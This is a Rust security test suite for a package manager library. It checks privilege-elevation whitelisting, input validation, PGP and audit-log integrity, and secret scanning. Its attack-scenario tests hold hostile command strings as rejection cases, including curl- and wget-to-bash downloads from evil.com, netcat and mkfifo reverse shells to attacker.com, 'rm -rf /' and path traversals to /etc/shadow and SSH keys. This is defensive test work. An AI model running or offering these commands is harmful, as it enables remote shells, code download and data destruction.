//! S-Tier Security and Privilege Escalation Test Suite
//!
//! Comprehensive security testing covering:
//! - Privilege escalation (sudo, pkexec, capabilities)
//! - Security validation (input sanitization, path traversal)
//! - PGP/Signature verification
//! - SBOM/Audit integrity
//! - Attack scenario simulations
//!
//! Run: cargo test --test `security_privilege_escalation_tests`

#![allow(clippy::unwrap_used, clippy::expect_used)]

use omg_lib::core::privilege::{PrivilegeChecker, SystemPrivilegeChecker};
use omg_lib::core::security::audit::{AuditEventType, AuditLogger, AuditSeverity};
#[cfg(feature = "pgp")]
use omg_lib::core::security::pgp::PgpVerifier;
use omg_lib::core::security::policy::{SecurityGrade, SecurityPolicy};
use omg_lib::core::security::secrets::{SecretScanner, SecretSeverity};
use omg_lib::core::security::slsa::{SlsaLevel, SlsaVerifier};
use omg_lib::core::security::validation::*;
use std::fs;
use tempfile::{NamedTempFile, TempDir};

// ═══════════════════════════════════════════════════════════════════════════
// 1. PRIVILEGE ESCALATION TESTS
// ═══════════════════════════════════════════════════════════════════════════

mod privilege_escalation {
    use super::*;

    // Note: MockPrivilegeChecker is only available in unit tests (cfg(test))
    // These integration tests use the real SystemPrivilegeChecker

    #[test]
    fn test_system_privilege_checker_no_panic() {
        let checker = SystemPrivilegeChecker;
        // Should not panic, just check current privileges
        let _is_root = checker.is_root();
    }

    #[test]
    #[allow(unsafe_code)]
    fn test_elevation_whitelist_allowed_operations() {
        use omg_lib::core::privilege::elevate_for_operation;

        // Set test mode to prevent actual sudo execution
        // SAFETY: Setting env var in single-threaded test context
        unsafe {
            std::env::set_var("OMG_TEST_MODE", "1");
        }

        let empty_args = Vec::new();

        // Allowed operations - should either:
        // 1. Fail with test mode message (not whitelist rejection) — when NOT root
        // 2. Succeed (Ok(())) — when already running as root (e.g., CI Docker containers)
        //    because elevate_if_needed() sees is_root()==true and skips elevation.
        let result = elevate_for_operation("install", &empty_args);
        match &result {
            Ok(()) => {
                // Running as root — elevation was not needed, which is correct.
                // This happens in CI Docker containers.
            }
            Err(err) => {
                let err_str = err.to_string();
                assert!(
                    err_str.contains("not supported in development mode")
                        || err_str.contains("OMG_TEST_MODE"),
                    "Expected test mode error, got: {err_str}",
                );
            }
        }

        // For the rest, just verify they don't panic and the error is not about whitelist
        for op in ["remove", "upgrade", "update", "sync", "clean"] {
            let result = elevate_for_operation(op, &empty_args);
            if let Err(e) = result {
                let msg = e.to_string();
                assert!(
                    !msg.contains("not whitelisted"),
                    "Operation {op} should pass whitelist but got: {msg}",
                );
            }
        }

        // SAFETY: Cleaning up test env var after test completion
        unsafe {
            std::env::remove_var("OMG_TEST_MODE");
        }
    }

    #[test]
    fn test_elevation_whitelist_blocks_dangerous() {
        use omg_lib::core::privilege::elevate_for_operation;

        let empty_args = Vec::new();

        // Blocked operations
        let result = elevate_for_operation("search", &empty_args);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not whitelisted"));

        let result = elevate_for_operation("info", &empty_args);
        assert!(result.is_err());

        let result = elevate_for_operation("status", &empty_args);
        assert!(result.is_err());

        // Command injection attempts
        let result = elevate_for_operation("install; rm -rf /", &empty_args);
        assert!(result.is_err());

        let result = elevate_for_operation("install && cat /etc/passwd", &empty_args);
        assert!(result.is_err());
    }

    #[test]
    fn test_yes_flag_global_state() {
        use omg_lib::core::privilege::{get_yes_flag, set_yes_flag};

        // Initially false
        set_yes_flag(false);
        assert!(!get_yes_flag());

        // Set to true
        set_yes_flag(true);
        assert!(get_yes_flag());

        // Set back to false
        set_yes_flag(false);
        assert!(!get_yes_flag());
    }

    #[test]
    fn test_yes_flag_non_interactive_mode() {
        use omg_lib::core::privilege::{get_yes_flag, set_yes_flag};

        // Test that yes flag prevents interactive prompts
        set_yes_flag(true);
        assert!(get_yes_flag(), "Yes flag should be set");

        set_yes_flag(false);
        assert!(!get_yes_flag(), "Yes flag should be cleared");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 2. SECURITY VALIDATION TESTS
// ═══════════════════════════════════════════════════════════════════════════

mod security_validation {
    use super::*;

    #[test]
    fn test_package_name_validation_safe() {
        assert!(validate_package_name("python").is_ok());
        assert!(validate_package_name("python3").is_ok());
        assert!(validate_package_name("lib-foo").is_ok());
        assert!(validate_package_name("lib_bar").is_ok());
        assert!(validate_package_name("foo+bar").is_ok());
        assert!(validate_package_name("foo.bar").is_ok());
        assert!(validate_package_name("@angular/cli").is_ok());
    }

    #[test]
    fn test_package_name_command_injection() {
        // Shell injection
        assert!(validate_package_name("pkg; rm -rf /").is_err());
        assert!(validate_package_name("pkg$(whoami)").is_err());
        assert!(validate_package_name("pkg`id`").is_err());
        assert!(validate_package_name("pkg|nc evil.com").is_err());
        assert!(validate_package_name("pkg&& curl evil").is_err());
        assert!(validate_package_name("pkg\n/bin/bash").is_err());
    }

    #[test]
    fn test_package_name_path_traversal() {
        assert!(validate_package_name("../../../etc/passwd").is_err());
        assert!(validate_package_name("foo/../bar").is_err());
        assert!(validate_package_name("foo..bar").is_err());
    }

    #[test]
    fn test_package_name_option_injection() {
        assert!(validate_package_name("-rf").is_err());
        assert!(validate_package_name("--force").is_err());
        assert!(validate_package_name("-e /bin/sh").is_err());
    }

    #[test]
    fn test_package_name_hidden_files() {
        assert!(validate_package_name(".bashrc").is_err());
        assert!(validate_package_name(".ssh/id_rsa").is_err());
    }

    #[test]
    fn test_package_name_absolute_paths() {
        assert!(validate_package_name("/etc/passwd").is_err());
        assert!(validate_package_name("/bin/bash").is_err());
    }

    #[test]
    fn test_package_name_empty_and_length() {
        assert!(validate_package_name("").is_err());
        assert!(validate_package_name(&"a".repeat(256)).is_err());
        assert!(validate_package_name(&"a".repeat(255)).is_ok());
    }

    #[test]
    fn test_local_package_file_validation() {
        // Valid
        assert!(is_local_package_file("/home/user/pkg.pkg.tar.zst"));
        assert!(is_local_package_file("/tmp/pkg.pkg.tar.xz"));
        assert!(is_local_package_file("/var/cache/pkg.pkg.tar.gz"));
        assert!(is_local_package_file(
            "/tmp/brave-bin-1:1.73.104-1-x86_64.pkg.tar.zst"
        ));

        // Invalid - not absolute
        assert!(!is_local_package_file("pkg.pkg.tar.zst"));
        assert!(!is_local_package_file("./pkg.pkg.tar.zst"));

        // Invalid - wrong extension
        assert!(!is_local_package_file("/tmp/pkg.tar.gz"));
        assert!(!is_local_package_file("/tmp/pkg.deb"));

        // Invalid - path traversal
        assert!(!is_local_package_file("/home/../etc/pkg.pkg.tar.zst"));
        assert!(!is_local_package_file("/tmp/../root/pkg.pkg.tar.zst"));
    }

    #[test]
    fn test_version_validation() {
        // Valid versions
        assert!(validate_version("1.0.0").is_ok());
        assert!(validate_version("2.3.4-rc1").is_ok());
        assert!(validate_version("1:2.3.4").is_ok()); // epoch
        assert!(validate_version("1.0.0+build123").is_ok());
        assert!(validate_version("1.0~rc1").is_ok());

        // Invalid versions
        assert!(validate_version("").is_err());
        assert!(validate_version(&"1".repeat(129)).is_err());
        assert!(validate_version("1.0; rm -rf /").is_err());
        assert!(validate_version("1.0$(whoami)").is_err());
    }

    #[test]
    fn test_relative_path_validation() {
        // Valid
        assert!(validate_relative_path("foo/bar").is_ok());
        assert!(validate_relative_path("a/b/c.txt").is_ok());

        // Invalid
        assert!(validate_relative_path("").is_err());
        assert!(validate_relative_path("/etc/passwd").is_err());
        assert!(validate_relative_path("../../../etc/passwd").is_err());
        assert!(validate_relative_path("foo/../bar").is_err());
        assert!(validate_relative_path("foo//bar").is_err());
        assert!(validate_relative_path("foo\0bar").is_err());
    }

    #[test]
    fn test_symlink_attack_prevention() {
        // Path traversal via symlinks
        let paths = vec![
            "../../../etc/passwd",
            "link/../../../etc/shadow",
            "./../../../../root/.ssh/id_rsa",
        ];

        for path in paths {
            assert!(
                validate_relative_path(path).is_err(),
                "Should block symlink traversal: {path}",
            );
        }
    }

    #[test]
    fn test_toctou_race_prevention() {
        // Test validates that validation happens before use
        let temp_dir = TempDir::new().unwrap();
        let safe_path = temp_dir.path().join("safe.txt");

        fs::write(&safe_path, "safe content").unwrap();

        // Validate the path
        let path_str = safe_path.to_str().unwrap();
        let filename = safe_path.file_name().unwrap().to_str().unwrap();

        // File name should pass validation
        assert!(
            validate_package_name(filename).is_ok()
                || validate_package_name_or_file(path_str).is_ok()
        );
    }

    #[test]
    fn test_input_sanitization_special_chars() {
        use omg_lib::core::security::validation::sanitize_package_name;

        assert_eq!(sanitize_package_name("foo;bar"), "foobar");
        assert_eq!(sanitize_package_name("foo&&bar"), "foobar");
        assert_eq!(sanitize_package_name("foo|bar"), "foobar");
        assert_eq!(sanitize_package_name("foo`bar"), "foobar");
        assert_eq!(sanitize_package_name("foo$bar"), "foobar");
        assert_eq!(
            sanitize_package_name("foo-bar_baz.1+2@org/cli"),
            "foo-bar_baz.1+2@org/cli"
        );
    }

    #[test]
    fn test_dos_attack_prevention() {
        // Extremely long input
        let long_name = "a".repeat(10_000);
        assert!(validate_package_name(&long_name).is_err());

        // Many path segments
        let deep_path = (0..1000).map(|_| "a").collect::<Vec<_>>().join("/");
        assert!(validate_relative_path(&deep_path).is_ok() || deep_path.len() > 255);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 3. PGP/SIGNATURE VERIFICATION TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(feature = "pgp")]
mod pgp_verification {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_pgp_verifier_construction() {
        let verifier = PgpVerifier::new();
        // Should construct without panic
        assert!(std::ptr::addr_of!(verifier) as usize > 0);
    }

    #[test]
    fn test_signature_file_not_found() {
        let verifier = PgpVerifier::new();

        let mut data = NamedTempFile::new().unwrap();
        writeln!(data, "test data").unwrap();
        data.flush().unwrap();

        let result = verifier.verify_detached(
            data.path(),
            std::path::Path::new("/nonexistent.sig"),
            std::path::Path::new("/nonexistent.gpg"),
        );

        assert!(result.is_err(), "Should fail with missing signature");
    }

    #[test]
    fn test_invalid_signature_format() {
        let verifier = PgpVerifier::new();

        let mut data = NamedTempFile::new().unwrap();
        writeln!(data, "test data").unwrap();
        data.flush().unwrap();

        let mut sig = NamedTempFile::new().unwrap();
        writeln!(sig, "not a valid signature").unwrap();
        sig.flush().unwrap();

        let result =
            verifier.verify_detached(data.path(), sig.path(), std::path::Path::new("/dev/null"));

        // Should fail to parse signature
        assert!(
            result.is_err()
                || result
                    .unwrap_err()
                    .to_string()
                    .contains("No valid signature")
        );
    }

    #[test]
    fn test_memory_signature_verification() {
        let verifier = PgpVerifier::new();

        let data = b"test data";
        let invalid_sig = b"not a signature";

        let result = verifier.verify_memory(data, invalid_sig);
        assert!(result.is_err(), "Should fail with invalid signature");
    }

    #[test]
    fn test_expired_signature_handling() {
        // Test that expired signatures are rejected
        // This would require generating an expired test signature
        // For now, we verify the verifier handles edge cases
        let verifier = PgpVerifier::new();

        let data = b"test";
        let empty_sig = b"";

        let result = verifier.verify_memory(data, empty_sig);
        assert!(result.is_err());
    }

    #[test]
    fn test_revoked_key_handling() {
        // Verifier should reject signatures from revoked keys
        // The PgpVerifier.verify_detached() filters for .revoked(false)
        let verifier = PgpVerifier::new();

        // Empty keyring should fail verification
        let mut data = NamedTempFile::new().unwrap();
        writeln!(data, "data").unwrap();
        data.flush().unwrap();

        let mut sig = NamedTempFile::new().unwrap();
        writeln!(sig, "sig").unwrap();
        sig.flush().unwrap();

        let result =
            verifier.verify_detached(data.path(), sig.path(), std::path::Path::new("/dev/null"));

        assert!(result.is_err());
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 4. SBOM/AUDIT TESTS
// ═══════════════════════════════════════════════════════════════════════════

mod sbom_audit {
    use super::*;
    use std::io::Write;

    #[test]
    #[allow(unsafe_code)]
    fn test_audit_logger_creation() {
        // Should create in temp directory
        let temp_dir = TempDir::new().unwrap();
        // SAFETY: Setting test-specific data directory; test isolation ensures no conflicts
        unsafe {
            std::env::set_var("OMG_DATA_DIR", temp_dir.path());
        }

        let result = AuditLogger::new();
        assert!(result.is_ok(), "Should create audit logger");
    }

    #[test]
    fn test_audit_entry_hash_computation() {
        use omg_lib::core::security::audit::AuditEntry;

        let entry = AuditEntry {
            id: "test-123".to_string(),
            timestamp: "2026-02-06T00:00:00Z".to_string(),
            event_type: AuditEventType::PackageInstall,
            severity: AuditSeverity::Info,
            user: "test".to_string(),
            resource: "firefox".to_string(),
            description: "Installed firefox".to_string(),
            metadata: None,
            prev_hash: "genesis".to_string(),
            hash: None,
        };

        let hash = entry.compute_hash();
        assert!(!hash.is_empty());
        assert_eq!(hash.len(), 64); // SHA-256

        // Hash should be deterministic
        assert_eq!(hash, entry.compute_hash());
    }

    #[test]
    fn test_audit_entry_verification() {
        use omg_lib::core::security::audit::AuditEntry;

        let mut entry = AuditEntry {
            id: "test-456".to_string(),
            timestamp: "2026-02-06T00:00:00Z".to_string(),
            event_type: AuditEventType::PackageRemove,
            severity: AuditSeverity::Warning,
            user: "admin".to_string(),
            resource: "curl".to_string(),
            description: "Removed curl".to_string(),
            metadata: None,
            prev_hash: "abc123".to_string(),
            hash: None,
        };

        // Valid signature
        entry.hash = Some(entry.compute_hash());
        assert!(entry.verify(), "Valid entry should verify");

        // Tampered entry
        entry.description = "Tampered description".to_string();
        assert!(!entry.verify(), "Tampered entry should not verify");
    }

    #[test]
    #[allow(unsafe_code)]
    fn test_audit_chain_integrity() {
        let temp_dir = TempDir::new().unwrap();
        // SAFETY: Setting test-specific data directory; test isolation ensures no conflicts
        unsafe {
            std::env::set_var("OMG_DATA_DIR", temp_dir.path());
        }

        let mut logger = AuditLogger::new().unwrap();

        // Log multiple events
        logger
            .log(
                AuditEventType::PackageInstall,
                AuditSeverity::Info,
                "vim",
                "Installed vim",
            )
            .unwrap();

        logger
            .log(
                AuditEventType::PackageUpgrade,
                AuditSeverity::Info,
                "git",
                "Upgraded git",
            )
            .unwrap();

        logger
            .log(
                AuditEventType::SecurityAudit,
                AuditSeverity::Warning,
                "system",
                "Performed security audit",
            )
            .unwrap();

        // Verify integrity
        let report = logger.verify_integrity().unwrap();
        assert!(report.is_valid(), "Audit log should be valid");
        assert_eq!(report.total_entries, 3);
        assert_eq!(report.valid_entries, 3);
        assert!(report.chain_valid);
    }

    #[test]
    #[allow(unsafe_code)]
    fn test_audit_tamper_detection() {
        use omg_lib::core::security::audit::AuditEntry;
        use std::io::Write;

        let temp_dir = TempDir::new().unwrap();
        // Create audit subdirectory
        let audit_dir = temp_dir.path().join("audit");
        fs::create_dir_all(&audit_dir).unwrap();
        let log_path = audit_dir.join("audit.jsonl");

        // Write valid entry
        let mut entry1 = AuditEntry {
            id: "1".to_string(),
            timestamp: "2026-02-06T00:00:00Z".to_string(),
            event_type: AuditEventType::PackageInstall,
            severity: AuditSeverity::Info,
            user: "test".to_string(),
            resource: "pkg1".to_string(),
            description: "Install pkg1".to_string(),
            metadata: None,
            prev_hash: "genesis".to_string(),
            hash: None,
        };
        entry1.hash = Some(entry1.compute_hash());

        let mut file = fs::File::create(&log_path).unwrap();
        writeln!(file, "{}", serde_json::to_string(&entry1).unwrap()).unwrap();

        // Write tampered entry (hash doesn't match)
        let entry2 = AuditEntry {
            id: "2".to_string(),
            timestamp: "2026-02-06T00:01:00Z".to_string(),
            event_type: AuditEventType::PackageRemove,
            severity: AuditSeverity::Info,
            user: "test".to_string(),
            resource: "pkg2".to_string(),
            description: "Remove pkg2".to_string(),
            metadata: None,
            prev_hash: entry1.hash.as_ref().unwrap().clone(),
            hash: Some("invalid_hash".to_string()),
        };

        writeln!(file, "{}", serde_json::to_string(&entry2).unwrap()).unwrap();
        drop(file);

        // Verify should detect tampering
        // SAFETY: Setting test-specific data directory; test isolation ensures no conflicts
        unsafe {
            std::env::set_var("OMG_DATA_DIR", temp_dir.path());
        }
        let logger = AuditLogger::new().unwrap();
        let report = logger.verify_integrity().unwrap();

        assert!(!report.is_valid(), "Should detect tampered entry");
    }

    #[test]
    fn test_slsa_level_ordering() {
        assert!(SlsaLevel::Level3 > SlsaLevel::Level2);
        assert!(SlsaLevel::Level2 > SlsaLevel::Level1);
        assert!(SlsaLevel::Level1 > SlsaLevel::None);
    }

    #[test]
    fn test_slsa_hash_verification() {
        let verifier = SlsaVerifier::new().unwrap();

        let mut temp = NamedTempFile::new().unwrap();
        write!(temp, "test content").unwrap();
        temp.flush().unwrap();

        let correct_hash = "6ae8a75555209fd6c44157c0aed8016e763ff435a19cf186f76863140143ff72";
        assert!(verifier.verify_hash(temp.path(), correct_hash).unwrap());

        let wrong_hash = "0000000000000000000000000000000000000000000000000000000000000000";
        assert!(!verifier.verify_hash(temp.path(), wrong_hash).unwrap());
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 5. ATTACK SCENARIO TESTS
// ═══════════════════════════════════════════════════════════════════════════

mod attack_scenarios {
    use super::*;

    #[test]
    fn test_malicious_package_names() {
        let malicious = vec![
            "pkg; curl evil.com/malware.sh | bash",
            "pkg$(wget http://evil.com/backdoor.sh)",
            "pkg`nc -e /bin/bash attacker.com 4444`",
            "pkg|mkfifo /tmp/p; nc attacker.com 4444 0</tmp/p | /bin/sh",
            "pkg && echo 'evil' > /etc/passwd",
            "pkg || rm -rf --no-preserve-root /",
        ];

        for name in malicious {
            assert!(
                validate_package_name(name).is_err(),
                "Should reject malicious name: {name}",
            );
        }
    }

    #[test]
    fn test_path_injection_attacks() {
        let attacks = vec![
            "../../../etc/shadow",
            "../../../../../../root/.ssh/id_rsa",
            "/etc/passwd",
            "/proc/self/environ",
            "/dev/sda",
            "....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
        ];

        for path in attacks {
            // Should be blocked by validation
            assert!(
                validate_package_name(path).is_err() || validate_relative_path(path).is_err(),
                "Should block path injection: {path}",
            );
        }
    }

    #[test]
    fn test_command_injection_variants() {
        let injections = vec![
            "test;id",
            "test|whoami",
            "test||ls",
            "test&&cat /etc/passwd",
            "test\nwhoami",
            "test\r\nid",
            "test${IFS}whoami",
            "test$()whoami",
        ];

        for injection in injections {
            assert!(
                validate_package_name(injection).is_err(),
                "Should block command injection: {injection}",
            );
        }
    }

    #[test]
    fn test_privilege_bypass_attempts() {
        let bypass_attempts = vec![
            ("install", vec!["../../bin/evil".to_string()]),
            ("remove", vec!["../../../etc/passwd".to_string()]),
            ("upgrade", vec!["; rm -rf /".to_string()]),
        ];

        for (op, args) in bypass_attempts {
            // Should fail validation before elevation
            for arg in &args {
                assert!(
                    validate_package_name(arg).is_err()
                        || validate_package_name_or_file(arg).is_err(),
                    "Should block bypass attempt: {op} {arg}",
                );
            }
        }
    }

    #[test]
    fn test_dos_attacks() {
        // Extremely long package name
        let long_name = "a".repeat(100_000);
        assert!(validate_package_name(&long_name).is_err());

        // Many nested paths
        let deep = (0..10000).map(|_| "a").collect::<Vec<_>>().join("/");
        let result = validate_relative_path(&deep);
        // Should either reject or handle gracefully
        assert!(result.is_ok() || result.is_err());

        // Recursive symlinks would be caught at filesystem level
    }

    #[test]
    fn test_secret_scanner_detects_leaks() {
        let scanner = SecretScanner::new();

        // AWS keys (using realistic format, not EXAMPLE)
        let content = "AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE"; // Real format but still fake
        let _findings = scanner.scan_content(content, "test.env").unwrap();
        // Note: May be filtered as placeholder if contains "EXAMPLE"
        // So we'll test with actual private key pattern which is more reliable

        // Private keys - more reliably detected
        let content = "-----BEGIN RSA PRIVATE KEY-----\nMIIE...";
        let findings = scanner.scan_content(content, "key.pem").unwrap();
        assert!(!findings.is_empty(), "Should detect private key");
        assert!(
            findings
                .iter()
                .any(|f| f.severity == SecretSeverity::Critical)
        );
    }

    #[test]
    fn test_secret_scanner_ignores_placeholders() {
        let scanner = SecretScanner::new();

        let placeholders = vec![
            "api_key = 'your_api_key_here'",
            "password = 'example_password'",
            "token = '<YOUR_TOKEN>'",
            "secret = '${SECRET_KEY}'",
        ];

        for placeholder in placeholders {
            let findings = scanner.scan_content(placeholder, "test.txt").unwrap();
            assert!(
                findings.is_empty(),
                "Should ignore placeholder: {placeholder}",
            );
        }
    }

    #[test]
    fn test_security_policy_enforcement() {
        let policy = SecurityPolicy {
            minimum_grade: SecurityGrade::Verified,
            allow_aur: false,
            require_pgp: true,
            allowed_licenses: vec!["MIT".to_string(), "Apache-2.0".to_string()],
            banned_packages: vec!["telnet".to_string(), "ftp".to_string()],
        };

        // Banned package
        assert!(
            policy
                .check_package("telnet", false, Some("BSD"), SecurityGrade::Verified)
                .is_err()
        );

        // AUR when disabled
        assert!(
            policy
                .check_package("yay", true, Some("MIT"), SecurityGrade::Community)
                .is_err()
        );

        // Wrong license
        assert!(
            policy
                .check_package("pkg", false, Some("GPL-3.0"), SecurityGrade::Verified)
                .is_err()
        );

        // Below minimum grade
        assert!(
            policy
                .check_package("pkg", false, Some("MIT"), SecurityGrade::Community)
                .is_err()
        );

        // Valid package
        assert!(
            policy
                .check_package("vim", false, Some("MIT"), SecurityGrade::Verified)
                .is_ok()
        );
    }

    #[test]
    fn test_multiple_attack_vectors_simultaneously() {
        use omg_lib::core::security::validation::sanitize_package_name;

        // Combine multiple attack vectors
        let multi_attack = "../../../etc/passwd; curl evil.com | bash";

        // Should be blocked by validation
        assert!(validate_package_name(multi_attack).is_err());
        assert!(validate_relative_path(multi_attack).is_err());

        // Sanitization removes dangerous chars (/ is allowed for scoped packages like @org/pkg)
        let sanitized = sanitize_package_name(multi_attack);
        assert!(!sanitized.contains(';'), "Semicolons should be removed");
        assert!(!sanitized.contains('|'), "Pipes should be removed");
        // Note: '/' is allowed in package names for scoped packages like @angular/cli
    }

    #[test]
    fn test_unicode_attacks() {
        let unicode_attacks = vec![
            "\u{202E}evil.txt", // Right-to-left override
            "\u{FEFF}test",     // BOM
            "test\u{0085}",     // Next line
            "\u{2028}line",     // Line separator
        ];

        for attack in unicode_attacks {
            // Should handle gracefully without panic
            let result = validate_package_name(attack);
            assert!(
                result.is_ok() || result.is_err(),
                "Should handle unicode: {attack:?}",
            );
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 6. INTEGRATION TESTS
// ═══════════════════════════════════════════════════════════════════════════

mod integration {
    use super::*;

    #[test]
    fn test_privilege_escalation_with_validation() {
        // Valid package
        let pkg = "firefox";
        assert!(validate_package_name(pkg).is_ok());

        // Verify privilege checker works without actually elevating
        let checker = SystemPrivilegeChecker;
        let _ = checker.is_root(); // Should not panic

        // Invalid package
        let malicious = "pkg; rm -rf /";
        assert!(validate_package_name(malicious).is_err());
        // Validation prevents elevation attempt
    }

    #[test]
    #[allow(unsafe_code)]
    fn test_audit_log_security_events() {
        let temp_dir = TempDir::new().unwrap();
        // SAFETY: Setting test-specific data directory; test isolation ensures no conflicts
        unsafe {
            std::env::set_var("OMG_DATA_DIR", temp_dir.path());
        }

        let mut logger = AuditLogger::new().unwrap();

        // Log security events
        logger
            .log(
                AuditEventType::SignatureVerified,
                AuditSeverity::Info,
                "firefox-100.0.pkg.tar.zst",
                "Package signature verified",
            )
            .unwrap();

        logger
            .log(
                AuditEventType::VulnerabilityDetected,
                AuditSeverity::Critical,
                "openssl",
                "CVE-2024-1234 detected",
            )
            .unwrap();

        logger
            .log(
                AuditEventType::PolicyViolation,
                AuditSeverity::Warning,
                "telnet",
                "Attempted to install banned package",
            )
            .unwrap();

        // Verify all events logged
        let report = logger.verify_integrity().unwrap();
        assert_eq!(report.total_entries, 3);
        assert!(report.is_valid());
    }

    #[test]
    #[allow(unsafe_code)]
    fn test_end_to_end_security_workflow() {
        // Simulate complete security workflow
        let temp_dir = TempDir::new().unwrap();
        // SAFETY: Setting test-specific data directory; test isolation ensures no conflicts
        unsafe {
            std::env::set_var("OMG_DATA_DIR", temp_dir.path());
        }

        // 1. Validate package name
        let pkg_name = "vim";
        assert!(validate_package_name(pkg_name).is_ok());

        // 2. Check policy
        let policy = SecurityPolicy::default();
        assert!(
            policy
                .check_package(pkg_name, false, Some("MIT"), SecurityGrade::Verified)
                .is_ok()
        );

        // 3. Verify operation is in whitelist (would elevate if needed)
        // Skip actual elevation in tests as it requires sudo
        let checker = SystemPrivilegeChecker;
        // Just verify we can check root status without crashing
        let _ = checker.is_root();

        // 4. Audit the operation
        let mut logger = AuditLogger::new().unwrap();
        logger
            .log(
                AuditEventType::PackageInstall,
                AuditSeverity::Info,
                pkg_name,
                "Package installed successfully",
            )
            .unwrap();

        // Verify audit integrity
        let report = logger.verify_integrity().unwrap();
        assert!(report.is_valid());
    }
}
